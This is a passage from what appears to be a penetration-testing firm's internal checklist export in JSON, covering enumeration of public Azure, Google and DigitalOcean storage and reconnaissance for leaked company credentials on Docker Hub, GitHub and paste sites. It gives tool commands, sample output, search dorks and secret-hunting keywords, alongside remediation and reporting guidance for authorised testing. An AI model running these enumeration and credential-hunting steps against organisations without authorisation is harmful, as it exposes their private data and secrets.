							"remediationInstructions": "<p>Remove the &quot;List&quot; permission from the AWS S3 configuration. Ensure that the &quot;Everyone&quot; grantee option is not enabled on the bucket unless the bucket content is intended to be publicly accessible</p><p>Browse to [bucket_name].s3.amazonaws.com and see if data is returned.</p>"
						},
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "b25b3633-532a-4123-a81b-f7803daf3956",
						"name": "Excessive Privileges - Azure Blob - Manual Review",
						"instructions": "<h2>Instructions</h2><p>1. Identify bucket names by scanning in scope application for references, Google dorking for references, and guessing/permutating names.</p><p>2. Check list permission allow everyone to enumeration files.</p><p>3. Review files for sensitive data.</p><h2><strong>Variation: Azure Authenticated Users</strong></h2><p>Use the Dump-AzureDomainInfo-AzureRM script to review all of the Azure storage accounts. Look at the PublicFileURLs.txt files to review any available public files</p><h2><strong>Variation: Anonymous Users</strong></h2><p>Identify storage accounts that are in use in the Azure environment. Look for references to any &quot;blob.core.windows.net&quot; subdomains (IE: netspi.blob.core.windows.net). </p><p>Attempt to then enumerate valid containers within the storage account. Use Intruder to identify any live folders (IE: https://netspi.blob.core.windows.net/$BURP_Parameter?restype=container). Take the list of enumerated folders and attempt to list out all of the files (add ?restype=container&amp;comp=list to the end of the folder URL)</p><h2><strong>Variation: MicroBurst</strong></h2><p>1. Install MicroBurst from the NetSPI repository.</p><ul><li><p>https://github.com/NetSPI/MicroBurst</p></li></ul><p>2. Run the Invoke-EnumerateAzureBlobs command.</p><p>Before running the script, check the permutations.txt file and add any additional keywords (product/app names, subsidiaries, etc.) that may be applicable to the client. The company's name (or a shortened/common version of it) is typically specified using the -Base parameter, which the tool uses to build the permutations that it checks for.</p><p>Example:</p><pre><code>PS C:\\Tools&gt; Invoke-EnumerateAzureBlobs -Base netspi -OutputFile output.txt\nFound Storage Account -  netspiazure.blob.core.windows.net\nFound Storage Account -  netspikeys.blob.core.windows.net\nFound Storage Account -  netspistorage.blob.core.windows.net\n\nBing Found Storage Account - optivstorage.blob.core.windows.net\n\nFound Container - netspikeys.blob.core.windows.net/$root\n\tPublic File Available: https://netspikeys.blob.core.windows.net/$root/SuperSecretFile-1.txt\nFound Container - netspistorage.blob.core.windows.net/test\n\tPublic File Available: https://netspistorage.blob.core.windows.net/test/SuperSecretFile.txt</code></pre><p>3. Review the discovered blobs.</p><pre><code>PS C:\\Tools&gt; type .\\output.txt\nnetspiazure.blob.core.windows.net\nnetspikeys.blob.core.windows.net\nnetspistorage.blob.core.windows.net\noptivstorage.blob.core.windows.net\nhttps://netspikeys.blob.core.windows.net/$root/SuperSecretFile-1.txt\nhttps://netspistorage.blob.core.windows.net/test/SuperSecretFile.txt</code></pre><p>For any public files, just navigate to the file via the URL listed in the output.</p><h2>Variation: cloud_enum.py</h2><p>1. Download cloud_enum.py from https://github.com/initstring/cloud_enum and follow the installation instructions. </p><pre><code>git clone https://github.com/initstring/cloud_enum.git</code></pre><p>2. Run the following command.</p><pre><code>python3 cloud_enum.py -k netspi -ns 1.1.1.1\n\n&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;\n        cloud_enum\n   github.com/initstring\n&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;&#35;\n\n\nKeywords:    netspi\nMutations:   /home/ncroy/tools/cloud_enum/enum_tools/fuzz.txt\nBrute-list:  /home/ncroy/tools/cloud_enum/enum_tools/fuzz.txt\n\n[+] Mutations list imported: 242 items\n[+] Mutated results: 1453 items\n\n<strong>[TRUNCATED]</strong>\n++++++++++++++++++++++++++\n       azure checks\n++++++++++++++++++++++++++\n\n[+] Checking for Azure Storage Accounts\n[&#42;] Brute-forcing a list of 471 possible DNS names\n    [!] DNS Timeout on bigtablenetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspibilling.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on eventsnetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspinet.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netnetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on opsnetspi.blob.core.windows.net. Investigate if there are many of these.\n    [!] DNS Timeout on netspistats.blob.core.windows.net. Investigate if there are many of these.\n  HTTP-OK Storage Account: http://netspi.blob.core.windows.net/\n  HTTP-OK Storage Account: http://netspistorage.blob.core.windows.net/\n\n Elapsed time: 00:00:39\n\n[&#42;] Checking 2 accounts for status before brute-forcing\n[&#42;] Brute-forcing container names in 2 storage accounts\n[&#42;] Brute-forcing 213 container names in netspistorage.blob.core.windows.net\n[&#42;] Brute-forcing 213 container names in netspi.blob.core.windows.net\n\n Elapsed time: 00:00:39\n<strong>[TRUNCATED]</strong></code></pre><h2>Variation: Manual</h2><p>Google Dork:</p><pre><code>site:blob.core.windows.net &quot;CLIENT_NAME&quot;</code></pre><p>This search will return any public files that contain CLIENT_NAME. You can then identify the storage account and container from those files.</p><p>Accessing a list of anonymous files from blogs can also be done using the example below:</p><pre><code>https://myblob.blob.core.windows.net/?comp=list&amp;timeout=60&amp;maxresults=100</code></pre><p>Finally you can also review the following source for potential Azure blog usage:</p><ul><li><p>Github</p></li><li><p>Google dorks</p></li><li><p>Censius</p></li><li><p>Shodan</p></li></ul><p><strong>Other Azure Services</strong></p><p>Also, consider running enumeration against other windows.net services in Azure.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17063371,
							"uid": "f86442ee-9b3e-e811-80fe-ecf4bbd04073",
							"name": "Excessive Privileges - Public Blob Permissions - Azure",
							"description": "<p>The Azure Storage Account blob container is configured with Public (&quot;Blob&quot; or &quot;Container&quot;) permissions. These permissions could allow anonymous users to access files in the blob container. If the container is set to &quot;Container&quot; permissions, this also can allow for directory listing of the container. If set to &quot;Blob&quot;, anonymous users would need to know the full file path to access the blob.</p>",
							"severityId": 3,
							"businessImpact": "<p>&quot;Blob&quot; or &quot;Container&quot; public permissions on a blob container could allow anonymous users to access blobs. These public settings could also expose the blobs to the internet if there are no service level firewalls or if public access has not been explicitly disabled.</p><p>Unauthorized access to the files could result in the compromise of sensitive information. </p>",
							"sourceIdentifier": "M:7f91d45f-4e7b-4ac3-b8fb-07ed533d7d6e",
							"verificationInstructions": "<h2>Note</h2><p>AzureAudit will automatically report on this. This will always require manual testing followup. <strong><em>All &quot;Container&quot; level permissions should always use the PS script below to list, download, and investigate public files for sensitive info or secrets.</em></strong> &quot;Blob&quot; level should be reported as well.</p><h2>Instructions</h2><p>This should be called out if the following conditions are met:</p><ol><li><p>The Storage Account Container has public access settings of &quot;Container&quot; or &quot;Blob&quot;.</p></li></ol><p><strong>Portal</strong></p><p>Browse to the Storage Account &gt; Containers &gt; review each container for public access.</p><p><strong>Code</strong></p><p>Use the <em>Invoke-PublicStorageAccountBlobChecks.ps1</em> script in the AzureAudit repo &gt; Scripts folder.</p><p>Import the module and prepare the targets for scanning. The script can be used to enumerate public files for Storage Accounts that have <em>Container </em>public access set. Review the output of AzureAudit for PublicStorageContainers.csv. The publicaccounts.txt file below should be formatted as a tab separated list of Storage Account Names and Container Names, one set per line. The command below will output a CSV list of public files.</p><pre><code>Import-Module Invoke-PublicStorageAccountBlobChecks.ps1 -Force\n\n&#35; make sure you are logged out of Azure PowerShell before running this!\nInvoke-PublicStorageAccountBlobChecks -Verbose -FileIn publicaccounts.txt</code></pre><p>All public files should be downloaded and reviewed for sensitive info or secrets. You can use the additional download flag to automatically download files.</p><pre><code>Invoke-PublicStorageAccountBlobChecks -Verbose -FileIn publicaccounts.txt -Download</code></pre><p><strong>Backup Method</strong></p><p>Review the MicroBurst output (SubName-&gt;Files-&gt;txt files) for the public files.</p><ul><li><p>BlobFileUrls.txt has files with &quot;Blob&quot; permissions applied - These are public, but not listable</p></li><li><p>ContainersFileURLs.txt has files with &quot;Container&quot; permissions applied - These are public and listable</p></li></ul><h2>Reporting Requirements</h2><p>Verify the AzureAudit output in PublicStorageContainers.csv. For &quot;Blob&quot; public permissions on containers: Reader role does not allow us to see the contents of containers, so we will not know what files are public in a &quot;Blob&quot; public container. These should still be reported with the following additional language:</p><blockquote><p>Containers with &quot;Blob&quot; public access settings were identified. NetSPI performed all testing with the Reader role, which does not have the permissions to list the blob file contents of a container. The public files in &quot;Blob&quot; public containers could not be reviewed due to this. NetSPI strongly recommends reviewing the contents of these containers for publicly available files that contain sensitive information or secrets. Consider setting the access settings of the container to Private.</p></blockquote><h2>Further Testing</h2><p>All &quot;Container&quot; level permissions should always use the PS script to list, download, and investigate public files for sensitive info or secrets. Attempt to leverage any identified secrets or credentials to pivot to in-scope resources.</p><h2></h2><h2><strong>Anonymous Guessing</strong></h2><p>Use the Invoke-EnumerateAzureBlobs.ps1 script available in the MicroBurst Repo:</p><p>https://github.com/NetSPI/MicroBurst/blob/master/Invoke-EnumerateAzureBlobs.ps1</p><p>1. Download MicroBurst from https://github.com/netspi/microburst.</p><p>2. Import the module.</p><pre><code>set-executionpolicy bypass -scope process\nimport-module ./MicroBurst.psm1</code></pre><p>3. Create the c:\\permutations.txt file and add any additional keywords (product/app names, subsidiaries, etc.) that may be applicable to the client.</p><p>3. Run the Invoke-EnumerateAzureBlobs function.</p>",
							"references": "<ul><li>https://docs.microsoft.com/en-us/powershell/module/azure.storage/set-azurestoragecontaineracl?view=azurermps-6.11.0</li><li>https://blog.netspi.com/anonymously-enumerating-azure-file-resources/</li></ul>",
							"exploitInstructions": "<p>Use the Dump-AzureDomainInfo-AzureRM script to review all of the Azure storage accounts. Look at the PublicFileURLs.txt files to review any available public files.</p><p>Download any available files and review them for sensitive information.</p><p>Fun finds:</p><p>SQL Database backups</p><p>CSV files with configuration/setup credentials</p>",
							"remediationInstructions": "<p>Within the Azure portal (portal.azure.com) change the Access Policy for the container to Private.</p><p>Alternatively, the Set-AzureStorageContainer Azure cmdlet can be used to modify the public access permissions for containers. Where possible, set alerts for the &quot;Create/Update Storage Account&quot; signals to notify Azure administrators when permissions change for private blob containers.</p><ul><li><p>https://learn.microsoft.com/en-us/azure/storage/blobs/anonymous-read-access-prevent?tabs=portal</p></li></ul>"
						},
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "e6ee7f7a-2071-4bc3-8998-2d1b868aa512",
						"name": "Excessive Privileges - Google Cloud Storage - Manual Review",
						"instructions": "<h2><strong>Instructions</strong></h2><p>Attempt to identify excessive privileges and sensitive information in Google Cloud storage.</p><p><span style=\"color: red\"><strong>Review cloud_enum output from ExPowerPen or from running manually in the \"Cloud Service Discovery - cloud_enum_auth\" checklist item.</strong></span></p><h2><strong>Variation: Manual</strong></h2><p>1. Review in-scope websites for referenced google storage pages. </p><pre><code>https://console.cloud.google.com/storage/browser/[BUCKET_NAME]</code></pre><p>2. Attempt to guess spaces that use the company name and related information such as application names, domain names, and active directory domain names.</p><p>3. For enumerated spaces attempt to list and access files.</p><p>4. If confirm the space exists, but done have access to a file listing then use bing or google to look up other references.</p><p>5. Attempt to identify sensitive data.</p><h3><strong>API Documentation</strong></h3><p>https://cloud.google.com/storage-transfer/docs/configure-access</p><p>https://cloud.google.com/storage/docs/access-public-data</p><h2>Variation: GCPBucketBrute</h2><p>1. Download GCPBucketBrute and follow the installation instructions.</p><pre><code>https://github.com/RhinoSecurityLabs/GCPBucketBrute</code></pre><p>2. Run the tool</p><h3><strong>Reporting Requirements</strong></h3><p>Include a list of all buckets that provide list permissions to everyone. If sensitive data is found add separate high findings calling out unauthenticated access to sensitive data.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 6,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "d06b97d0-70f1-41f7-8f16-a986f2b51fc0",
						"name": "Excessive Privileges - Digital Ocean Spaces - Manual Review",
						"instructions": "<h2><strong>Instructions </strong></h2><p>1. Review in-scope websites for referenced Digital Ocean pages. </p><p>2. Attempt to guess spaces that use the company name and related information such as application names, domain names, and active directory domain names.</p><p>3. For enumerated spaces attempt to list and access files.</p><p>4. If confirm the space exists, but done have access to a file listing then use bing or google to look up other references.</p><p>5. Attempt to identify sensitive data.</p><h2><strong>Tools </strong></h2><p>Below are some tool options, but the API is pretty easy to wrap.</p><pre><code>https://github.com/appsecco/spaces-finder/ \nhttps://github.com/jhaddix/domain\nhttps://fubar.nyc3.digitaloceanspaces.com/\nhttps://www.digitalocean.com/community/tutorials/how-to-create-a-digitalocean-space-and-api-key\nhttps://developers.digitalocean.com/documentation/v2/\nhttps://developers.digitalocean.com/documentation/spaces/</code></pre><h2><strong>Reporting Requirements</strong></h2><p>Include a list of all buckets that provide list permissions to everyone. If sensitive data is found add separate high findings calling out unauthenticated access to sensitive data.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 7,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 6,
				"collapsed": true
			},
			{
				"uid": "12a61987-0923-4e65-b324-b6249f9bba52",
				"name": "Reconnaissance: Company Files",
				"description": "The goal of this task group is to identify files on the internet that reveal sensitive company data, source code, or credentials that could be used in later phases of the attack.",
				"type": 1,
				"tasks": [
					{
						"uid": "70d66422-0dd5-4354-80b1-168fc4b99521",
						"name": "Online Docker Repositories",
						"instructions": "<h2>Instructions</h2><p>Review docker hub for keywords related to the company. Provides insights into technologies, environment information, and in some cases credentials.</p><h2>Variation: Manual</h2><p><strong>Search URL:</strong></p><pre><code>https://hub.docker.com/search?q=optum&amp;type=image  </code></pre><p>Usually you'll download the docker image, run it, and then review it for cached / stored credentials. Below instructions work for kali linux.</p><p><strong>NOTE:</strong> <strong>Use caution when downloading and running Docker images. Always use a suitable VM and remember that they're of unknown origin.</strong></p><ol><li><p>apt-get install docker</p></li><li><p>dockerd</p></li><li><p>docker pull usbank/testnode</p></li><li><p>docker images</p></li><li><p>docker run -i -t 3e2d36063d1f /bin/bash</p></li></ol><h2>Additional Tools/Articles</h2><p><a href='https://github.com/deepfence/SecretScanner'>https://github.com/deepfence/SecretScanner</a></p><p><a href='https://ioactive.com/guest-blog-docker-hub-scanner-matias-sequeira/'><u>https://ioactive.com/guest-blog-docker-hub-scanner-matias-sequeira/</u></a></p><p><a href='https://github.com/matiassequeira/docker_explorer'>https://github.com/matiassequeira/docker_explorer</a></p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "12e7c3fe-c249-4b74-b8aa-946e0d194776",
						"name": "Online GitHub Repositories [ExPowerPen]",
						"instructions": "<h2><strong>Variation: Manual</strong></h2><p>1. Always search using multiple keywords. Once keyword should be client specific and one related to the data type. Common generic keywords to use with company specific information:  </p><ul><li><p>password</p></li><li><p>secret</p></li><li><p>key</p></li><li><p>private</p></li><li><p>user</p></li><li><p>account</p></li><li><p>connectionstring</p></li><li><p>confidential</p></li><li><p>proprietary</p></li></ul><p>2. Using Active Directory domains, applications names, and legal language specific to the client can be very effective.</p><p>3. Reuse information discovered in additional searches. Active Directory domains and legal language especially.</p><p>4. Sample data using some of the strategies below when there are million of records:</p><ul><li><p>Sample high value file types associated with config files, server side languages, and desktop app languages (c#, java, asp, c++, .conf, .xml, ,json etc)</p></li><li><p>Group/sample by the same username (only review a handful of code example for any single user, and mark them for follow up as needed)</p></li><li><p>Group/sample by the same Repository name (many time different users will have copies of the same repository)</p></li><li><p>Group/sample by the same File name (only review a handful for any single filename)</p></li></ul><h2><strong>Variation: Trufflehog</strong></h2><h2>IMPORTANT - ONLY RUN WITH THE --no-verification flag.</h2><p>Without the --no-verification flag, Trufflehog will automatically attempt to validate default credentials which can cause issues with database services, AWS services, or similar. Ensure trufflehog is executed with this flag.</p><p>1. Download the latest release.</p><ul><li><p><a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/trufflesecurity/trufflehog\">https://github.com/trufflesecurity/trufflehog</a></p></li></ul><p>2. Manually search <a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"http://GitHub.com\">GitHub.com</a> for an organization for the company.</p><ul><li><p>https://github.com/search?q=<span style=\"color: red\"><strong>[REPLACE WITH SEARCH TERM]</strong></span>+type%3Aorg&amp;type=users</p></li></ul><ul><li><p><strong>Note:</strong> Without a valid organization Trufflehog will do nothing of value.</p></li></ul><p>3. Run the tool substituting the organization name for the --org=[company name] argument</p><h3>Example:</h3><pre><code>trufflehog github --org=netspi --no-verification</code></pre><p><strong>Additional Checks</strong></p><p>Review .git in relevant public repositories.</p><p><a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/liamg/gitjacker\">https://github.com/liamg/gitjacker</a></p><p><strong>Reporting Requirements</strong></p><ol><li><p>Ensure all affected URLs are included in the verification</p></li><li><p>Ensure a sample of redacted examples is included in the verification for each data type exposed</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17063992,
							"uid": "d96a307b-dea7-e811-8103-ecf4bbd04073",
							"name": "Information Disclosure - Public GitHub Repository",
							"description": "<p>Internal usernames or other company data were found in files associated with a publicly accessible github.com code repository.</p>",
							"severityId": 2,
							"businessImpact": "<p>An attacker with access to internal company data could potentially use it to gain unauthorized access to associated systems, applications, and sensitive data.</p>",
							"sourceIdentifier": "M:f72e1570-5ed5-45d9-8be1-952421e037cc",
							"verificationInstructions": "",
							"references": "<ul><li>https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that passwords and other sensitive data are not accessible to unauthenticated internet users via publicly accessible github.com repositories. Consider removing the github.com repository, purging the affected file from the repository's history, or making the affected repositories private.</p>"
						},
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "4aaef69e-d016-4412-8d7a-5b45e7e15d22",
						"name": "Online GitHub Repositories (Sensitive Info Finding) [ExPowerPen]",
						"instructions": "<h2>Instructions</h2><p>Search online code repositories for sensitive information and credentials.</p><h3></h3><h2>Variation: Manual</h2><p>1. Always search using multiple keywords. Once keyword should be client specific and one related to the data type. Common generic keywords to use with company specific information:  </p><ul><li><p>password</p></li><li><p>secret</p></li><li><p>key</p></li><li><p>private</p></li><li><p>user</p></li><li><p>account</p></li><li><p>connectionstring</p></li><li><p>confidential</p></li><li><p>proprietary</p></li></ul><p>2. Using Active Directory domains, applications names, and legal language specific to the client can be very effective.</p><p>3. Reuse information discovered in additional searches. Active Directory domains and legal language especially.</p><p>4. Sample data using some of the strategies below when there are million of records:</p><ul><li><p>Sample high value file types associated with config files, server side languages, and desktop app languages (c#, java, asp, c++, .conf, .xml, ,json etc)</p></li><li><p>Group/sample by the same username (only review a handful of code example for any single user, and mark them for follow up as needed)</p></li><li><p>Group/sample by the same Repository name (many time different users will have copies of the same repository)</p></li><li><p>Group/sample by the same File name (only review a handful for any single filename)</p></li></ul><h2>Variation: Trufflehog</h2><h2>IMPORTANT - ONLY RUN WITH THE --no-verification flag.</h2><p>Without the --no-verification flag, Trufflehog will automatically attempt to validate default credentials which can cause issues with database services, AWS services, or similar. Ensure trufflehog is executed with this flag.</p><p>1. Download the latest release.</p><ul><li><p>https://github.com/trufflesecurity/trufflehog</p></li></ul><p>2. Run the tool.</p><h3>Example:</h3><pre><code>trufflehog github --org=netspi --no-verification</code></pre><p><strong>Additional Checks</strong></p><p>Review .git in relevant public repositories.</p><p><a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://github.com/liamg/gitjacker\">https://github.com/liamg/gitjacker</a></p><p><strong>Reporting Requirements</strong></p><ol><li><p>Ensure all affected URLs are included in the verification</p></li><li><p>Ensure a sample of redacted examples is included in the verification for each data type exposed</p></li></ol>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17062676,
							"uid": "a8378ae6-79e4-e711-80ff-ecf4bbd04083",
							"name": "Sensitive Information Disclosure - Public GitHub Repository",
							"description": "<p>Cleartext passwords were found in files associated with a publicly accessible github.com code repository.</p>",
							"severityId": 4,
							"businessImpact": "<p>An attacker with access to cleartext credentials could potentially use them to gain unauthorized access to the associated systems, applications, and sensitive data.</p>",
							"sourceIdentifier": "M:04701768-6256-4622-8a03-c67911e34523",
							"verificationInstructions": "<p><strong>Goal</strong></p><p>Identify sensitive data stored on github.com </p><p><strong>Approach Summary</strong></p><p>Review github.com for domains, users, companies, and applications associated with the scope.</p><p><strong>Searching Tips</strong></p><p>1. Always search using multiple keywords.  Once keyword should be client specific and one related to the data type.</p><p>   Common generic keywords to use with company specific information:</p><p>   password</p><p>   secret</p><p>   key   </p><p>   private</p><p>   user</p><p>   account</p><p>   connectionstring</p><p>   confidential</p><p>   proprietary</p><p>2. Using Active Directory domains, applications names, and legal language specific to the client can be very effective.</p><p>3. Reuse information discovered in additional searches. Active Directory domains and legal language especially.</p><p>4. Sample data using some of the strategies below when there are million of records:</p><p>   Sample high value file types associated with config files, server side languages, and desktop app languages (c&#35;, java, asp, c++, .conf, .xml, ,json etc)</p><p>   Group/sample by the same username (only review a handful of code example for any single user, and mark them for follow up as needed)</p><p>   Group/sample by the same Repository name (many time different users will have copies of the same repository)</p><p>   Group/sample by the same File name (only review a handful for any single filename)</p><p><strong>Additional Checks</strong></p><p>Review .git in relevant public repositories.</p><p><a href='https://github.com/liamg/gitjacker'>https://github.com/liamg/gitjacker</a></p><p><strong>Reporting Requirements</strong></p><ol><li><p>Ensure all affected URLs are included in the verification</p></li><li><p>Ensure a sample of redacted examples is included in the verification for each data type exposed</p></li></ol>",
							"references": "<ul><li>https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that passwords and other sensitive data are not accessible to unauthenticated internet users via publicly accessible github.com repositories. Consider removing the github.com repository, purging the affected file from the repository's history, or making the affected repositories private.</p>"
						},
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "24a39bf1-3b57-4c0b-bdf3-40b20c87e60e",
						"name": "Online Clipboards [ExPowerPen]",
						"instructions": "<h2>Instructions</h2><p>Attempt to identify files through Google dorking common online clipboard sites.</p><h2>Variation: Manual</h2><p><strong>Google Dorks</strong></p><p>Below are a few search examples.</p><pre><code>Site:pastebin.com &quot;companyname&quot; keywords\nSite:pastey.com &quot;companyname&quot; keywords</code></pre><p><strong>Below are common online clipboards:</strong></p><pre><code>http://pastebin.com/\nhttps://cipher387.github.io/pastebinsearchengines/\nhttps://redhuntlabs.com/online-ide-search\nhttp://www.filedropper.com/\nhttp://FriendPaste.com\nhttp://CopyTaste.com\nhttp://Cl1p.net\nhttp://ShortText.com\nhttp://TextSave.de\nhttp://TextSnip.com\nhttp://TxtB.inhttp://jsfiddle.net/</code></pre><p>An online tool to search a number of paste sites at once is located here:</p><pre><code>https://netbootcamp.org/pastesearch.html&#35;gsc.tab=0</code></pre><p><strong>Finding Additional Online Clipboards</strong></p><p>If you are able to get the blocklists from a web proxy, then you may be able to filter for common online clipboards that are on that list. If you get one of those blocklists please reference it here.</p><h3>Other references</h3><p>https://posts.specterops.io/being-a-good-domain-shepherd-57754edd955f</p><p>https://blog.netspi.com/adding-web-content-filter-exceptions-for-phishing-success/</p><p>https://github.com/jarun/googler</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17068006,
							"uid": "d203eb1d-8c37-439e-a28d-0e137278be38",
							"name": "Information Disclosure - Online Clipboards",
							"description": "<p>Cleartext information like usernames, internal hostnames, internal domain names, etc. were found in online clipboards.</p>",
							"severityId": 2,
							"businessImpact": "<p>An attacker with access to cleartext information could potentially use it to develop attacks against associated systems, applications, and sensitive data.</p>",
							"sourceIdentifier": "M:d203eb1d-8c37-439e-a28d-0e137278be38",
							"verificationInstructions": "<p><strong>Instructions</strong></p><p>Attempt to identify files through Google dorking common online clipboard sites.</p><p><strong>Google Dorks</strong></p><p>Below are a few search examples.</p><p>Site:pastebin.com &quot;companyname&quot; keywords</p><p>Site:pastey.com &quot;companyname&quot; keywords</p><p><strong>Target sites below</strong></p><p>Below are common online clipboards.</p><p>http://pastebin.com/</p><p>https://cipher387.github.io/pastebinsearchengines/ </p><p>https://redhuntlabs.com/online-ide-search</p><p>http://www.filedropper.com/</p><p>http://FriendPaste.com</p><p>http://CopyTaste.com</p><p>http://Cl1p.net</p><p>http://ShortText.com</p><p>http://TextSave.de</p><p>http://TextSnip.com</p><p>http://TxtB.in</p><p>http://jsfiddle.net/</p><p>An online tool to search a number of paste sites at once is located here:</p><p>https://netbootcamp.org/pastesearch.html&#35;gsc.tab=0</p><p><strong>Findings Additional Online Clipboards</strong></p><p>If you are able to get the blocklists from a web proxy, then you may be able to filter for common online clipboards that are on that list.  If you get one of those blocklists please reference it here.</p><p><strong>Other references</strong></p><p>https://posts.specterops.io/being-a-good-domain-shepherd-57754edd955f</p><p>https://blog.netspi.com/adding-web-content-filter-exceptions-for-phishing-success/</p><p>https://github.com/jarun/googler</p>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that internal information is not accessible to unauthenticated internet users via publicly accessible clipboards.</p>"
						},
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "a5ced59d-2b53-433a-8f19-f7bd594d82b5",
						"name": "Online Clipboards (Sensitive Info Finding) [ExPowerPen] ",
						"instructions": "<h2>Instructions</h2><p>Attempt to identify files through Google dorking common online clipboard sites.</p><h2>Variation: Manual</h2><p><strong>Google Dorks</strong></p><p>Below are a few search examples.</p><pre><code>Site:pastebin.com &quot;companyname&quot; keywords\nSite:pastey.com &quot;companyname&quot; keywords\nsite:ideone.com | site:codebeautify.org | site:codeshare.io | site:codepen.io | site:repl.it | site:justpaste.it | site:pastebin.com | site:jsfiddle.net | site:trello.com | site:friendpaste.com | site:cl1p.com | site:textsave.de | site:textsnip.com | site:txtb.in | site:shorttext.com | site:filedropper.com &lt;domain&gt;</code></pre><p><strong>Below are common online clipboards:</strong></p><pre><code>http://pastebin.com/\nhttps://cipher387.github.io/pastebinsearchengines/ \nhttps://redhuntlabs.com/online-ide-search\nhttp://www.filedropper.com/\nhttp://FriendPaste.com\nhttp://CopyTaste.com\nhttp://Cl1p.net\nhttp://ShortText.com\nhttp://TextSave.de\nhttp://TextSnip.com\nhttp://TxtB.in\nhttp://jsfiddle.net/</code></pre><p>An online tool to search a number of paste sites at once is located here:</p><pre><code>https://netbootcamp.org/pastesearch.html&#35;gsc.tab=0</code></pre><p><strong>Finding Additional Online Clipboards</strong></p><p>If you are able to get the blocklists from a web proxy, then you may be able to filter for common online clipboards that are on that list. If you get one of those blocklists please reference it here.</p><h3>Other references</h3><p>https://posts.specterops.io/being-a-good-domain-shepherd-57754edd955f</p><p>https://blog.netspi.com/adding-web-content-filter-exceptions-for-phishing-success/</p><p>https://github.com/jarun/googler</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17063358,
							"uid": "cdbd709d-623e-e811-80fe-ecf4bbd04073",
							"name": "Sensitive Information Disclosure - Online Clipboards",
							"description": "<p>Cleartext sensitive information like user credentials, secrets etc. were found in online clipboards.</p>",
							"severityId": 3,
							"businessImpact": "<p>An attacker with access to cleartext credentials or secrets could potentially use them to gain unauthorized access to the associated systems, applications, and sensitive data.</p>",
							"sourceIdentifier": "M:6422f7d9-779b-4fce-afad-2400eaf11bc6",
							"verificationInstructions": "<p><strong>Instructions</strong></p><p>Attempt to identify files through Google dorking common online clipboard sites.</p><p><strong>Google Dorks</strong></p><p>Below are a few search examples.</p><p>Site:pastebin.com &quot;companyname&quot; keywords</p><p>Site:pastey.com &quot;companyname&quot; keywords</p><p><strong>Target sites below</strong></p><p>Below are common online clipboards.</p><p>http://pastebin.com/</p><p>https://cipher387.github.io/pastebinsearchengines/ </p><p>https://redhuntlabs.com/online-ide-search</p><p>http://www.filedropper.com/</p><p>http://FriendPaste.com</p><p>http://CopyTaste.com</p><p>http://Cl1p.net</p><p>http://ShortText.com</p><p>http://TextSave.de</p><p>http://TextSnip.com</p><p>http://TxtB.in</p><p>http://jsfiddle.net/</p><p>An online tool to search a number of paste sites at once is located here:</p><p>https://netbootcamp.org/pastesearch.html&#35;gsc.tab=0</p><p><strong>Findings Additional Online Clipboards</strong></p><p>If you are able to get the blocklists from a web proxy, then you may be able to filter for common online clipboards that are on that list.  If you get one of those blocklists please reference it here.</p><p><strong>Other references</strong></p><p>https://posts.specterops.io/being-a-good-domain-shepherd-57754edd955f</p><p>https://blog.netspi.com/adding-web-content-filter-exceptions-for-phishing-success/</p><p>https://github.com/jarun/googler</p>",
							"references": "",
							"exploitInstructions": "",
